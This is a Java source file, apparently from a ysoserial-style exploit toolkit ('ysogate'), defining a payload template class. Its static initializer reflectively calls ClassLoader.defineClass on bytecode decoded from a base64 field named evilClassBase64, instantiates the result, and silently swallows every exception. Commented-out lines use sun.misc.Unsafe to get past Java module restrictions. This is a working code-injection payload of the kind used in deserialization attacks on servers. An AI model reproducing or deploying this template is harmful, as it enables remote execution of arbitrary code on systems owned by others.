package com.h2tg.ysogate.template;

public class DefineClassTemplate
{
    static String evilClassBase64;
    static {
        try {
//            Class unsafeClass = Class.forName("sun.misc.Unsafe");
//            java.lang.reflect.Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
//            unsafeField.setAccessible(true);
//            sun.misc.Unsafe unsafe = (sun.misc.Unsafe) unsafeField.get(null);
//            Module module = Object.class.getModule();
//            Class cls = e.class;
//            long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
//            unsafe.getAndSetObject(cls, offset, module);
            java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            defineClass.setAccessible(true);
            byte[] bytecode = java.util.Base64.getDecoder().decode(evilClassBase64);
            Class clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), bytecode, 0, bytecode.length);
            clazz.newInstance();
        } catch (Exception e) {
        }
    }
}
